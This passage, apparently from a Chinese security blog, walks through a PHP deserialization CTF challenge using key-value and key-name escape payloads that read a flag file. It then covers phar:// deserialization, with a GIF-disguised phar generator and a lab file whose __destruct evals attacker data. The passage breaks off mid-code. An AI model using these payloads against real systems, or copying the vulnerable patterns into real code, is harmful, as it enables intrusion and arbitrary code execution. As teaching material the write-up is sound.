class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><ol><li>根据提示：?f=phpinfo</li></ol></blockquote><p>发现</p><p><img src="https://i.loli.net/2021/06/13/ZhFTAEVcpUiew78.png" alt="image-20210613154055563"></p><blockquote><ol start="2"><li>auto_append_file 在任何页面输出前首先包含 d0g3_f1ag.php文件，猜测 flag存在于 该文件当中。那我们需要想办法读取到该文件；</li><li>当 <code>$function == &#39;show_image&#39;</code> 时，首先对 <code>$serialize_info</code> 进行反序列化，然后对其中 <code>$userinfo[&#39;img&#39;]</code> 进行base64解码之后，使用 <code>file_get_contents</code> 读取出文件；而 <code>$serialize_info</code> 正是我们所传入的 <code>$function</code> 在 进行 <code>filter()</code> 函数过滤之后的结果；</li></ol></blockquote><p>手动添加以下代码，输出查看序列化之后的内容：</p><p><img src="https://i.loli.net/2021/06/13/cjrJVkIPAGnb1To.png" alt="image-20210613164010874"></p><p>该 base64 编码 <code>Z3Vlc3RfaW1nLnBuZw==</code> 即是 <code>guest_img.png</code></p><blockquote><ol start="4"><li>我们需要使 <code>键 img </code> 为 <code>d0g3_f1ag.php</code> 文件加密之后的内容；<code>ZDBnM19mMWFnLnBocA==</code> 是 <code>d0g3_f1ag.php</code></li></ol></blockquote><p>构造 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">post 传参：</span><br><span class="line">   </span><br><span class="line">_SESSION[user]=a&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">p</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化后 </span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">128</span>) <span class="string">&quot;a:3:&#123;s:4:&quot;</span>user<span class="string">&quot;;s:1:&quot;</span>a<span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">42</span>:<span class="string">&quot;p&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;&quot;</span> </span><br></pre></td></tr></table></figure><p>以上内容如果进行反序列化，将会报错，原因：</p><blockquote><ol start="5"><li>前面 <code>a:3:</code> 表示 SESSION 含有三个键值对，它会一直向后取直到取到三个为止；第一个 user 正常取值；第二个 function 由于长度是 42 ，将会取到的值是 <code>p&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code> ；所以仍旧会取到第三个 img 值为 <code>Z3Vlc3RfaW1nLnBuZw==</code> ；但是进行反序列化之后，我们希望得到的是第三个 img 被挤掉，以我们在 function 中传递的 img 作为新的 img ；所以实际上如果 <code>s:42:&quot;p&quot;</code> 是 <code>s:1:&quot;p&quot;</code> 就好了。 </li><li>利用过滤函数使字符减少来增大长度，吞掉后面部分内容。</li></ol></blockquote><p>测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">b</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回 string(127) &quot;a:3:&#123;s:4:&quot;user&quot;;s:4:&quot;&quot;;s:8:&quot;function&quot;;s:42:&quot;b&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot; </span></span><br></pre></td></tr></table></figure><blockquote><ol start="7"><li><code>&quot;;s:8:&quot;function&quot;;s:42:&quot;b</code> 长度是 24，构造 user 值是 6个 flag ，即长度是 24，将会把 <code>&quot;;s:8:&quot;function&quot;;s:42:&quot;b</code>吞掉，当作 user 的值；而 img 即为我们的 <code>d0g3_f1ag.php</code>；再手动补充一个键值对（随意）满足 _SESSION 的三个键；而位于最后的默认的 <code>guest_img.png</code> 将被挤掉，不会起作用；</li></ol><p> <strong>注意：</strong>由于吞掉了一个键值对，我们把 img 作为第二个键名存在了，但 SESSION 本身是有三个键值对的，如果我们不手动添加一个键值对的话，最后存在的原本的 img 也将会被解析，起不到挤掉的作用。</p></blockquote><p><strong>payload1 —  键值逃逸：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">b</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化后 string(146) &quot;a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:60:&quot;b&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;c&quot;;s:3:&quot;111&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot; </span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/13/dbMkafNKIsSPulh.png" alt="0"></p><blockquote><ol start="8"><li>对 <code>/d0g3_fllllllag</code> 进行 base64编码为 <code>L2QwZzNfZmxsbGxsbGFn</code>，长度是 20；</li></ol><p> 构造以下内容：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">b</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/13/LroXScDCuzgTatf.png" alt="image-20210613172316408"></p><blockquote><ol start="9"><li><code>&quot;;s:49:</code> 长度是 7，构造 键名为 flagphp，将其吞掉作为一个新的键名，值是 db；第二个键名 img 即是我们所构造的；由于 <code>a:2:</code>，因此一共只会取两个键名，所以最后的 img 被挤掉了。</li></ol></blockquote><p><strong>payload2 —  键名逃逸：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagphp]=;s:<span class="number">2</span>:<span class="string">&quot;db&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化后 string(108) &quot;a:2:&#123;s:7:&quot;&quot;;s:49:&quot;;s:2:&quot;db&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p><strong>函数总结：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">implode()把数组元素组合为一个字符串后返回：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;Hello&#x27;</span>,<span class="string">&#x27;World!&#x27;</span>,<span class="string">&#x27;Beautiful&#x27;</span>,<span class="string">&#x27;Day!&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> implode(<span class="string">&quot; &quot;</span>,<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment"># 返回 Hello World! Beautiful Day!</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">unset</span>()销毁指定的变量    </span><br><span class="line">    </span><br><span class="line">extract() 函数从数组中将变量导入到当前的符号表</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;Original&quot;</span>;</span><br><span class="line"><span class="variable">$my_array</span> = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;Dog&quot;</span>, <span class="string">&quot;c&quot;</span> =&gt; <span class="string">&quot;Horse&quot;</span>);</span><br><span class="line">extract(<span class="variable">$my_array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a = <span class="subst">$a</span>; \$b = <span class="subst">$b</span>; \$c = <span class="subst">$c</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment"># 返回 $a = Cat; $b = Dog; $c = Horse </span></span><br><span class="line">该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</span><br><span class="line"></span><br><span class="line">第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。</span><br><span class="line"></span><br><span class="line">该函数返回成功导入到符号表中的变量数目。</span><br></pre></td></tr></table></figure><h1 id="三、phar-序列化"><a href="#三、phar-序列化" class="headerlink" title="三、phar 序列化"></a>三、phar 序列化</h1><p><a href="https://www.cnblogs.com/zzjdbk/p/13030571.html">https://www.cnblogs.com/zzjdbk/p/13030571.html</a></p><p><a href="https://blog.csdn.net/qq975353472/article/details/109668373">https://blog.csdn.net/qq975353472/article/details/109668373</a></p><p><a href="https://xz.aliyun.com/t/2715">https://xz.aliyun.com/t/2715</a></p><p>一般利用反序列化漏洞，一般都是借助unserialize()函数。</p><p><strong>新型攻击方式：利用Phar:// 伪协议读取phar文件时，会反序列化meta-data储存的信息。</strong></p><ul><li>特点：不使用 <code>unserialize()函数</code></li></ul><p><strong>利用条件：</strong></p><ul><li>能够上传 <code>.phar</code> 文件至服务器</li><li>存在可用的 魔术方法 作为跳板</li><li>文件操作函数的参数可控</li><li><code>/  :   phar</code>  等特殊字符未被过滤</li></ul><p><strong>受影响函数列表：</strong></p><p><img src="https://i.loli.net/2021/08/16/Gg6PJzalCAp9mhr.png" alt="image-20210816150354206"></p><p>原理参考 <a href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a></p><h2 id="3-1-phar-介绍"><a href="#3-1-phar-介绍" class="headerlink" title="3.1 phar 介绍"></a>3.1 phar 介绍</h2><p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，会以序列化的形式存储用户自定义的 <code>meta-data</code> ，当受影响的文件操作函数调用 phar 文件时，会自动反序列化 meta-data 中的内容。</p><p>在PHP 5.3 或更高版本中默认开启，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。用来将多个PHP文件打包为一个文件.可以和tar zip相互转化。</p><ul><li>版本 &gt;5.2</li></ul><p><strong>php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。</strong>内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 <strong>phar://就是一种内置的流包装器。</strong></p><p><strong>php中一些常见的流包装器如下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure><h2 id="3-2-phar-文件结构"><a href="#3-2-phar-文件结构" class="headerlink" title="3.2 phar 文件结构"></a>3.2 phar 文件结构</h2><ul><li><p>a stub</p><p>phar 文件的标志，前面内容不限，必须以 __HALT_COMPILER();?&gt; 结尾，否则 phar 扩展将无法识别该文件是 phar文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</span><br></pre></td></tr></table></figure></li><li><p>a manifest describing the contents</p><p>Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点。</p><p><img src="https://i.loli.net/2021/08/16/Iv3lNjUXtFoZpcw.png" alt="image-20210816144952619"></p></li><li><p>the file contents</p><p>所被压缩的文件内容，在无特殊要求的情况下，该内容可随意写</p></li><li><p>a signature for verifying Phar integrity</p><p>签名格式，位于末尾</p><p><img src="https://i.loli.net/2021/08/16/ROTrMWvjBeo1pmK.png" alt="image-20210816145202078"></p></li></ul><h2 id="3-3-测试：phar-文件的构造"><a href="#3-3-测试：phar-文件的构造" class="headerlink" title="3.3 测试：phar 文件的构造"></a>3.3 测试：phar 文件的构造</h2><ul><li><p>条件：php.ini</p><p><img src="https://i.loli.net/2021/08/16/zHR9QuMXmZEYaSO.png" alt="image-20210816145304311"></p></li></ul><p><strong>编写 生成 .phar 文件</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;1.phar&quot;</span>); <span class="comment">//后缀必须为 .phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">// 设置 stub</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$o</span>-&gt;data = <span class="string">&#x27;hacker123!&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的 meta-data 存入 manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名将自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问过后，会在当前目录下生成 <code>1.phar</code> 文件，打开，看其内容</p><p><img src="https://i.loli.net/2021/08/16/fIErdgbOZQ3Gs7t.png" alt="image-20210816150109626"></p><p><strong>发现，meta-data 是以序列化的形式存储的</strong></p><p><strong>那么，在哪里进行反序列化？</strong></p><p><strong>phar://协议读取文件</strong></p><ul><li><p>php 大部分的文件系统函数在通过 <code>phar://</code> 伪协议解析 phar 文件时，都会将 meta-data 进行反序列化，经测试后，所受影响的函数有</p><p><img src="https://i.loli.net/2021/08/16/Gg6PJzalCAp9mhr.png" alt="image-20210816150354206"></p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://1.phar&#x27;</span>);<span class="comment">//phar:// 触发：进行反序列化</span></span><br></pre></td></tr></table></figure><p>访问，成功触发了反序列化，得到 </p><p><img src="https://i.loli.net/2021/09/10/ev7ay5QxkIJBdtG.png" alt="image-20210816150553492"></p><h2 id="3-4-常见利用：文件上传-文件包含"><a href="#3-4-常见利用：文件上传-文件包含" class="headerlink" title="3.4 常见利用：文件上传+文件包含"></a>3.4 常见利用：文件上传+文件包含</h2><p><strong>环境：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload_file.php <span class="comment"># 后端检测文件上传,确保文件类型及后缀是 .gif</span></span><br><span class="line">upload_file.html <span class="comment">#文件上传表单前端</span></span><br><span class="line">file_un.php  <span class="comment">#存在 file_exists() 以及  __destruct() 用以phar://伪协议读取文件内容</span></span><br></pre></td></tr></table></figure><p><strong>利用条件：</strong></p><ul><li>存在文件上传</li><li>存在 <code>file_exists()  fopen()  file_get_contents()  file()</code> 等文件操作函数</li><li><code>phar://</code> 等字符未被过滤</li></ul><p><strong>upload_file.php</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(substr(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+1))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Upload: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Temp file: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload_file/&quot;</span> .<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Invalid file,you can only upload gif&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><strong>upload_file.html</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;http://localhost:8080/ctf/phar/upload_file.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;Upload&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p><strong>file_un.php</strong>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlihgt_file(__FILE__);</span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="variable">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure><p><strong>题目：</strong></p><p><img src="https://i.loli.net/2021/08/16/dOqcxFjsStoZmlM.png" alt="image-20210816151653686"></p><p><strong>生成 .phar 文件：</strong>phar.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//highlihgt_file(__FILE__);</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;hack.phar&quot;</span>); <span class="comment">//后缀必须为 .phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); <span class="comment">// 设置 stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span 